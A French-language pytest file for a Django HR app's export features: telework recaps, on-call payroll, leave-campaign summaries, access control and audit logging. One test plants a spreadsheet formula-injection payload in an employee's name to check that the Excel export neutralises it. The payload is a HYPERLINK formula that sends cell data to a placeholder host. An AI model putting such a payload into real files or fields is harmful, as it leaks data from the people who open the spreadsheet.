"""Exports RH (L3-08) : télétravail mensuel, paie des astreintes, synthèse de campagne."""

import csv
import io
from datetime import date
from decimal import Decimal

import pytest
from django.utils import timezone
from openpyxl import load_workbook

from apps.approvals.models import LeaveRequest, OnCallDeclaration, RequestStatus, TeleworkRequest
from apps.core.models import AuditLog
from apps.core.tenancy import tenant_context
from apps.people.models import Employee
from tests.factories import EmployeeFactory

pytestmark = pytest.mark.django_db
HYPERLINK = '=HYPERLINK("https://exemple.test/?d="&A1;"clic")'


def rows_of(response):
    assert response.status_code == 200, response.content[:300]
    return list(csv.reader(io.StringIO(response.content.decode("utf-8-sig")), delimiter=";"))


def approved(model, requester, **data):
    return model.objects.create(
        requester=requester, status=RequestStatus.APPROVED, submitted_at=timezone.now(), **data
    )


@pytest.mark.parametrize("path", ["/teletravail/export/", "/astreintes/export/", "/conges/export/"])
@pytest.mark.parametrize("who", ["employee", "manager"])
def test_hr_exports_are_reserved_to_hr_and_admin(client_for, company_a, path, who):
    assert client_for(getattr(company_a, who)).get(path).status_code == 403
    assert client_for(company_a.hr).get(path).status_code == 200
    assert client_for(company_a.admin).get(f"{path}?mois=2026-11&format=csv").status_code in (
        200,
        422,
    )


def test_export_button_is_shown_to_hr_only(client_for, company_a):
    assert "/teletravail/export/" in client_for(company_a.hr).get("/teletravail/").content.decode()
    assert (
        "/teletravail/export/"
        not in client_for(company_a.employee).get("/teletravail/").content.decode()
    )


def test_monthly_telework_recap(client_for, company_a):
    with tenant_context(company_a.company):
        for day in (3, 10, 17):
            approved(TeleworkRequest, company_a.employee, date=date(2026, 11, day))
        TeleworkRequest.objects.create(
            requester=company_a.employee, date=date(2026, 11, 24), submitted_at=timezone.now()
        )  # en attente : non comptée
        approved(TeleworkRequest, company_a.employee, date=date(2026, 12, 1))  # autre mois
    rows = rows_of(client_for(company_a.hr).get("/teletravail/export/?mois=2026-11&format=csv"))
    assert rows[0] == [
        "Collaborateur",
        "Matricule",
        "Service",
        "Jours de télétravail validés",
        "Dates",
    ]
    camille = next(r for r in rows if r[0] == company_a.employee.full_name)
    assert camille[3] == "3" and camille[4] == "03/11, 10/11, 17/11"
    louise = next(r for r in rows if r[0] == company_a.manager.full_name)
    assert louise[3] == "0"


def test_on_call_payroll_export(client_for, company_a):
    with tenant_context(company_a.company):
        approved(
            OnCallDeclaration, company_a.employee, start=date(2026, 10, 30), end=date(2026, 11, 2)
        )
        approved(
            OnCallDeclaration,
            company_a.employee,
            kind=OnCallDeclaration.Kind.INTERVENTION,
            start=date(2026, 11, 7),
            end=date(2026, 11, 7),
            hours=Decimal("2.5"),
        )
    rows = rows_of(client_for(company_a.hr).get("/astreintes/export/?mois=2026-11&format=csv"))
    camille = next(r for r in rows if r[0] == company_a.employee.full_name)
    assert camille[3:] == ["2", "1", "2,5"]  # 1er et 2 novembre, une intervention de 2,5 h


def test_excel_export_neutralizes_formulas(client_for, company_a):
    Employee.all_companies.filter(pk=company_a.employee.pk).update(first_name=HYPERLINK)
    response = client_for(company_a.hr).get("/teletravail/export/?mois=2026-11&format=xlsx")
    sheet = load_workbook(io.BytesIO(response.content)).active
    cells = [c for row in sheet.iter_rows() for c in row if c.value and "HYPERLINK" in str(c.value)]
    assert cells and all(c.data_type == "s" and c.value.startswith("'") for c in cells)


def test_export_modal_validates_then_redirects_to_the_file(client_for, company_a):
    client = client_for(company_a.hr)
    bad = client.get("/teletravail/export/?mois=novembre&format=csv", HTTP_HX_REQUEST="true")
    assert bad.status_code == 422 and "Choisissez le mois." in bad.content.decode()
    ok = client.get("/teletravail/export/?mois=2026-11&format=csv", HTTP_HX_REQUEST="true")
    assert ok.status_code == 204 and ok["HX-Redirect"].startswith("/teletravail/export/?")


def test_exports_are_logged_without_names(client_for, company_a):
    client_for(company_a.hr).get("/astreintes/export/?mois=2026-11&format=xlsx")
    log = AuditLog.all_companies.get(company=company_a.company, action="requests.exported")
    assert log.summary == "Export paie des astreintes, novembre 2026, Excel"


def test_campaign_summary_by_service_and_week(client_for, company_a):
    campaign = company_a.requests["campaign"]  # 1er juin – 30 sept. 2027, seuil 30 %
    with tenant_context(company_a.company):
        colleague = EmployeeFactory(company=company_a.company, service=company_a.service)
        LeaveRequest.objects.create(
            requester=colleague,
            campaign=campaign,
            start=date(2027, 7, 5),
            end=date(2027, 7, 9),
            submitted_at=timezone.now(),
        )
    client = client_for(company_a.hr)
    page = client.get(f"/conges/campagnes/{campaign.pk}/synthese/")
    content = page.content.decode()
    assert page.status_code == 200 and "Synthèse de la campagne Été 2027" in content
    assert "seuil dépassé" in content  # 2 absents sur 6 la semaine du 5 juillet (33 %)
    rows = rows_of(client.get(f"/conges/campagnes/{campaign.pk}/synthese/?format=csv"))
    support = next(r for r in rows if r[0] == company_a.service.name)
    week = rows[0].index("Semaine du 05/07")
    assert support[2] == "2" and support[week] == "2 (33 %) !"
    assert (
        client_for(company_a.manager).get(f"/conges/campagnes/{campaign.pk}/synthese/").status_code
        == 403
    )
    log = AuditLog.all_companies.get(company=company_a.company, action="requests.exported")
    assert "Été 2027" in log.summary and "CSV" in log.summary


def test_leave_export_modal_offers_the_campaigns(client_for, company_a):
    response = client_for(company_a.hr).get("/conges/export/")
    assert "Été 2027" in response.content.decode()
    campaign = company_a.requests["campaign"]
    file = client_for(company_a.hr).get(f"/conges/export/?campagne={campaign.pk}&format=xlsx")
    assert file["Content-Type"].startswith("application/vnd.openxmlformats")
